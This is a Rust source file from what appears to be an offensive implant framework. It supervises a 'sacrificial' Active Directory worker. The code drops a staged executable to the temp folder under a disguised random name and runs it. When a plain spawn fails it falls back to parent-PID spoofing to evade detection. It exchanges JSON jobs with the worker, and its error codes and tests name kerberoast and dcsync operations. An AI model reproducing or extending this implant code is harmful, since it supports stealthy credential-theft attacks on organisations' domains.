//! L2 `ad` sacrificial worker — length-prefixed JSON jobs (KD-17).
//!
//! Stage0 never LoadLibrary/Manual-Map the ad PE. Domain protocol (LDAP/roast)
//! lives only in the worker binary; this module only frames, spawns, and collects.

use super::{
    clamp_worker_deadline_ms, err_result, should_force_kill_on_wait, supervisor,
    DROPPED_WORKER_OUTPUTS, MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES, WORKER_TIMEOUTS,
};
#[cfg(windows)]
use super::force_kill;
use crate::types::CommandResult;
#[cfg(windows)]
use log::{info, warn};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::sync::atomic::Ordering;

#[cfg(windows)]
fn write_temp_ad_host(pe: &[u8]) -> Result<std::path::PathBuf, String> {
    let mut dir = std::env::temp_dir();
    let name = format!(
        "~AD{:08X}{:04X}.exe",
        crate::utils::next_u32(),
        (crate::utils::next_u32() & 0xffff) as u16
    );
    dir.push(name);
    std::fs::write(&dir, pe).map_err(|e| format!("write ad host: {e}"))?;
    Ok(dir)
}

/// Request body written after `u32le` length prefix (UTF-8 JSON).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdWorkerRequest {
    pub request_id: String,
    pub op: String,
    #[serde(default)]
    pub params: Value,
    #[serde(default = "default_deadline")]
    pub deadline_ms: u64,
}

fn default_deadline() -> u64 {
    30_000
}

/// Response body after `u32le` length prefix.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdWorkerResponse {
    #[serde(default)]
    pub request_id: String,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub stdout: String,
    #[serde(default)]
    pub stderr: String,
    #[serde(default)]
    pub error_code: String,
}

/// Encode request as `u32le_len || json_utf8`.
pub fn encode_ad_request_frame(req: &AdWorkerRequest) -> Result<Vec<u8>, String> {
    let body = serde_json::to_vec(req).map_err(|e| e.to_string())?;
    if body.len() > MAX_PAYLOAD_BYTES {
        return Err("ad request too large".into());
    }
    let mut frame = Vec::with_capacity(4 + body.len());
    frame.extend_from_slice(&(body.len() as u32).to_le_bytes());
    frame.extend_from_slice(&body);
    Ok(frame)
}

/// Parse response frame `u32le_len || json_utf8`.
pub fn parse_ad_response_frame(data: &[u8]) -> Result<AdWorkerResponse, String> {
    if data.len() < 4 {
        return Err("ad response short header".into());
    }
    let len = u32::from_le_bytes([data[0], data[1], data[2], data[3]]) as usize;
    if len > MAX_OUTPUT_BYTES * 2 {
        return Err("ad response too large".into());
    }
    if data.len() < 4 + len {
        return Err("ad response truncated".into());
    }
    serde_json::from_slice(&data[4..4 + len]).map_err(|e| format!("ad response json: {e}"))
}

/// Design-stable AD application outcomes that must **not** open the worker circuit.
/// Workgroup `ad_discover` → `not_domain_joined` is normal; counting it as failure
/// would block subsequent `ping` after a few discovers.
pub fn is_ad_soft_application_error(stderr: &str) -> bool {
    let s = stderr.trim();
    if s.is_empty() {
        return false;
    }
    // Operator staging gap — not worker instability
    if s.contains("module_required:") {
        return true;
    }
    // Design error_code strings (exact or prefixed)
    const CODES: &[&str] = &[
        "not_domain_joined",
        "unsupported_platform",
        "feature_disabled",
        "not_implemented",
        "dc_unreachable",
        "unknown_op",
        "invalid_params",
        "access_denied",
        "ldap_bind_failed",
        "ldap_sign_required",
    ];
    for c in CODES {
        if s == *c || s.starts_with(&format!("{c}:")) || s.starts_with(&format!("{c} ")) {
            return true;
        }
    }
    // Worker scaffold long form: "op 'kerberoast' not implemented in ad worker..."
    if s.contains("not implemented") {
        return true;
    }
    // feature_disabled long form
    if s.contains("feature_disabled") || s.contains("ad-dcsync feature") {
        return true;
    }
    false
}

/// True when the CommandResult should increment the AD fail_streak / open circuit.
pub fn ad_result_is_circuit_failure(result: &CommandResult) -> bool {
    if result.stderr.is_empty() {
        return false;
    }
    if is_ad_soft_application_error(&result.stderr) {
        return false;
    }
    // Hard failures: timeout, spawn/reader panic, payload limits, etc.
    true
}

/// Run one AD job in the registered sacrificial PE (op e.g. `ping`).
///
/// Missing PE → stderr contains `module_required:ad`.
pub fn execute_ad_job(op: &str, params: &Value, deadline_ms: u64) -> CommandResult {
    let body = serde_json::to_vec(&serde_json::json!({
        "request_id": format!("ad-{}", crate::utils::next_u32()),
        "op": op,
        "params": params,
        "deadline_ms": deadline_ms,
    }))
    .unwrap_or_default();
    if body.len() > MAX_PAYLOAD_BYTES {
        return err_result("payload too large");
    }

    {
        let mut g = match supervisor().inner.lock() {
            Ok(x) => x,
            Err(_) => return err_result("supervisor lock"),
        };
        if g.inflight >= supervisor().max_concurrent {
            return err_result("too many concurrent workers");
        }
        let streak = *g.fail_streak.get("ad").unwrap_or(&0);
        if streak >= supervisor().circuit_open_after {
            return err_result("circuit open: ad worker failures");
        }
        if !g.pe.contains_key("ad") {
            return err_result("module_required:ad (worker PE not staged)");
        }
        g.inflight += 1;
        g.status.insert(
            "ad".into(),
            super::WorkerStatus {
                state: super::WorkerState::Busy,
                last_error: None,
                updated: std::time::Instant::now(),
            },
        );
    }

    let result = run_ad_worker(&body, deadline_ms);

    if let Ok(mut g) = supervisor().inner.lock() {
        g.inflight = g.inflight.saturating_sub(1);
        let fail = ad_result_is_circuit_failure(&result);
        let streak = g.fail_streak.entry("ad".into()).or_insert(0);
        if fail {
            *streak = streak.saturating_add(1);
            if result.stderr.contains("timeout") {
                WORKER_TIMEOUTS.fetch_add(1, Ordering::Relaxed);
            }
        } else {
            // Soft app errors and success reset the streak so normal discover on
            // workgroup hosts never trips the circuit.
            *streak = 0;
        }
        let open = *streak >= supervisor().circuit_open_after;
        g.status.insert(
            "ad".into(),
            super::WorkerStatus {
                state: if open {
                    super::WorkerState::Failed
                } else if result.stderr.contains("timeout") {
                    super::WorkerState::Timeout
                } else {
                    super::WorkerState::Ready
                },
                last_error: if fail {
                    Some(result.stderr.clone())
                } else {
                    None
                },
                updated: std::time::Instant::now(),
            },
        );
    }
    result
}

#[cfg(windows)]
fn run_ad_worker(json_body: &[u8], deadline_ms: u64) -> CommandResult {
    let pe = match supervisor().get_pe("ad") {
        Some(p) if p.len() > 64 && p[0] == b'M' && p[1] == b'Z' => p,
        _ => return err_result("module_required:ad (worker PE not staged)"),
    };

    // Rebuild framed request: body may already be full JSON without length prefix.
    let mut frame = Vec::with_capacity(4 + json_body.len());
    frame.extend_from_slice(&(json_body.len() as u32).to_le_bytes());
    frame.extend_from_slice(json_body);

    let job = super::job_object::JobObject::create();
    // Use .exe suffix — some Windows policies refuse CreateProcess on .tmp images.
    let path = match write_temp_ad_host(&pe) {
        Ok(p) => p,
        Err(e) => return err_result(e),
    };
    let cmdline = format!("\"{}\"", path.to_string_lossy());
    // Prefer plain piped spawn for reliable stdin job frames; fall back to PPID spoof.
    let parent = crate::isolated_exec::pick_parent_for_supervisor();
    let child = match crate::native::spawn::spawn_piped_plain(&cmdline) {
        Ok(c) => c,
        Err(e_plain) => {
            match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
                Ok(c) => c,
                Err(e) => {
                    let _ = std::fs::remove_file(&path);
                    return err_result(format!("spawn ad worker: plain={e_plain}; spoof={e}"));
                }
            }
        }
    };
    if let Some(ref j) = job {
        if j.assign_process(child.h_process).is_err() {
            warn!("[supervisor] ad AssignProcessToJobObject failed — kill uncontained worker");
            let _ = crate::native::terminate_process_handle(child.h_process);
            let _ = crate::native::close_handle(child.stdin_write);
            let _ = crate::native::close_handle(child.stdout_read);
            let _ = crate::native::close_handle(child.h_process);
            let _ = std::fs::remove_file(&path);
            return err_result("worker isolation setup failed");
        }
    } else {
        let _ = crate::native::terminate_process_handle(child.h_process);
        let _ = crate::native::close_handle(child.stdin_write);
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        let _ = std::fs::remove_file(&path);
        return err_result("worker isolation unavailable");
    }
    info!("[supervisor] ad worker pid={}", child.pid);

    let write_res = crate::native::pipe_write_all(child.stdin_write, &frame);
    let _ = crate::native::close_handle(child.stdin_write);
    if let Err(e) = write_res {
        force_kill(child.h_process, &job);
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        let _ = std::fs::remove_file(&path);
        return err_result(e);
    }

    let stdout_read = child.stdout_read;
    let max_out = MAX_OUTPUT_BYTES;
    let reader = std::thread::spawn(move || -> Result<Vec<u8>, String> {
        let hdr = crate::native::pipe_read_exact(stdout_read, 4)?;
        let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
        if out_len > max_out * 2 {
            return Err("worker output too large".into());
        }
        let body = crate::native::pipe_read_exact(stdout_read, out_len)?;
        let _ = crate::native::close_handle(stdout_read);
        let mut full = Vec::with_capacity(4 + body.len());
        full.extend_from_slice(&hdr);
        full.extend_from_slice(&body);
        Ok(full)
    });

    let wait_ms = clamp_worker_deadline_ms(deadline_ms);
    let ok = crate::native::wait_for_single_object_timeout(child.h_process, wait_ms);
    if should_force_kill_on_wait(ok) {
        WORKER_TIMEOUTS.fetch_add(1, Ordering::Relaxed);
        force_kill(child.h_process, &job);
        let _ = crate::native::close_handle(child.h_process);
        let _ = std::fs::remove_file(&path);
        let _ = reader.join();
        return err_result("worker timeout");
    }

    let read_result = match reader.join() {
        Ok(r) => r,
        Err(_) => {
            let _ = crate::native::close_handle(child.h_process);
            let _ = std::fs::remove_file(&path);
            return err_result("worker reader panicked");
        }
    };
    let _ = crate::native::close_handle(child.h_process);
    let _ = std::fs::remove_file(&path);

    match read_result {
        Ok(frame) => match parse_ad_response_frame(&frame) {
            Ok(resp) => map_ad_worker_response(resp),
            Err(e) => err_result(e),
        },
        Err(e) => {
            if e.contains("too large") {
                DROPPED_WORKER_OUTPUTS.fetch_add(1, Ordering::Relaxed);
            }
            err_result(e)
        }
    }
}

/// Map AD worker JSON response → CommandResult.
/// `status != "ok"` is always an error path: promote `error_code` into stderr when
/// stderr is empty so soft codes (feature_disabled / not_domain_joined) never look
/// like success.
pub fn map_ad_worker_response(resp: AdWorkerResponse) -> CommandResult {
    let ok = resp.status.eq_ignore_ascii_case("ok");
    if ok {
        return CommandResult {
            stdout: if resp.stdout.is_empty() {
                resp.status
            } else {
                resp.stdout
            },
            stderr: resp.stderr,
            path: None,
            req_id: None,
        };
    }
    let stderr = if !resp.stderr.is_empty() {
        resp.stderr
    } else if !resp.error_code.is_empty() {
        resp.error_code
    } else {
        resp.status
    };
    CommandResult {
        stdout: resp.stdout,
        stderr,
        path: None,
        req_id: None,
    }
}

#[cfg(not(windows))]
fn run_ad_worker(_json_body: &[u8], _deadline_ms: u64) -> CommandResult {
    err_result("unsupported_platform")
}

#[cfg(test)]
mod soft_error_tests {
    use super::*;

    fn cr(stderr: &str, stdout: &str) -> CommandResult {
        CommandResult {
            stdout: stdout.into(),
            stderr: stderr.into(),
            path: None,
            req_id: None,
        }
    }

    #[test]
    fn map_error_status_promotes_error_code_when_stderr_empty() {
        let r = map_ad_worker_response(AdWorkerResponse {
            request_id: "x".into(),
            status: "error".into(),
            stdout: String::new(),
            stderr: String::new(),
            error_code: "feature_disabled".into(),
        });
        assert_eq!(r.stderr, "feature_disabled");
        assert!(ad_result_is_circuit_failure(&r) == false || is_ad_soft_application_error(&r.stderr));
        assert!(!r.stderr.is_empty());

        let r2 = map_ad_worker_response(AdWorkerResponse {
            request_id: "y".into(),
            status: "error".into(),
            stdout: String::new(),
            stderr: String::new(),
            error_code: "not_domain_joined".into(),
        });
        assert_eq!(r2.stderr, "not_domain_joined");

        let ok = map_ad_worker_response(AdWorkerResponse {
            request_id: "z".into(),
            status: "ok".into(),
            stdout: "pong".into(),
            stderr: String::new(),
            error_code: String::new(),
        });
        assert_eq!(ok.stdout, "pong");
        assert!(ok.stderr.is_empty());
    }

    #[test]
    fn soft_codes_do_not_trip_circuit() {
        for code in [
            "not_domain_joined",
            "unsupported_platform",
            "feature_disabled",
            "not_implemented",
            "dc_unreachable",
            "module_required:ad (worker PE not staged)",
            "op 'kerberoast' not implemented in ad worker (B0/B1 partial; see AD_MODULE_DESIGN)",
            "dcsync requires ad-dcsync feature (default off)",
        ] {
            assert!(
                is_ad_soft_application_error(code),
                "expected soft: {code}"
            );
            assert!(
                !ad_result_is_circuit_failure(&cr(code, "")),
                "circuit must not open for soft: {code}"
            );
        }
        // Success
        assert!(!ad_result_is_circuit_failure(&cr("", "pong")));
        // Hard failures still trip
        for hard in [
            "worker timeout",
            "payload too large",
            "worker reader panicked",
            "supervisor lock",
        ] {
            assert!(
                ad_result_is_circuit_failure(&cr(hard, "")),
                "expected hard circuit failure: {hard}"
            );
        }
    }

    #[test]
    fn repeated_soft_errors_do_not_open_ad_circuit() {
        // Simulate recording soft discover results without going through PE.
        if let Ok(mut g) = supervisor().inner.lock() {
            g.fail_streak.insert("ad".into(), 0);
        }
        for _ in 0..10 {
            let soft = cr("not_domain_joined", "");
            if let Ok(mut g) = supervisor().inner.lock() {
                let fail = ad_result_is_circuit_failure(&soft);
                let streak = g.fail_streak.entry("ad".into()).or_insert(0);
                if fail {
                    *streak = streak.saturating_add(1);
                } else {
                    *streak = 0;
                }
            }
        }
        let streak = supervisor()
            .inner
            .lock()
            .map(|g| *g.fail_streak.get("ad").unwrap_or(&0))
            .unwrap_or(99);
        assert_eq!(streak, 0, "soft discovers must reset streak, got {streak}");
        assert!(streak < supervisor().circuit_open_after);
    }
}
